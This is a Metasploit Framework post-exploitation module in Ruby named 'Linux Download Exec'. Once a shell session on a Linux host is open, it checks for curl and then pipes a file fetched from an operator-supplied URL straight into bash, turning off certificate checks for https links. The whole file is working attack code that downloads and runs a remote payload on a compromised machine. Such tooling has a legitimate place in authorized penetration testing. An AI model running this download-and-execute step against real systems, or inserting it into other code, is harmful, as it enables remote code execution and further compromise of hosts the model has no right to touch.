##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Linux Download Exec',
			'Description'   => %q{
				This module downloads and runs a file with bash. It uses curl and bash from the PATH.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Joshua D. Abraham <jabra[at]praetorian.com>',
				],
			'Platform'      => [ 'linux' ],
			'SessionTypes'  => [ 'shell' ]
		))

		register_options(
		[
			OptString.new('URL', [true, 'Full URL of file to download.'])
		], self.class)

	end

	def exists_exe?(exe)
		path = expand_path("$PATH")
		if path.nil? or path.empty?
			return false
		end

		path.split(":").each{ |p|
			return true if file_exist?(p + "/" + exe)
		}

		return false
	end

	def run
		print_status("Checking if curl exists in the path...")
		if exists_exe?("curl")
			print_good("curl available, going ahead...")
		else
			print_warning("curl not available on the $PATH, aborting...")
			return
		end

		if datastore['URL'].match(/https/)
			cmd_exec_vprint("`which curl` -k #{datastore['URL']} 2>/dev/null | `which bash` ")
		else
			cmd_exec_vprint("`which curl` #{datastore['URL']} 2>/dev/null | `which bash` ")
		end
	end

	def cmd_exec_vprint(cmd)
		vprint_status("Executing: #{cmd}")
		output = cmd_exec(cmd)
		if output.length > 0
			vprint_status("#{output}")
		end
		return
	end
end
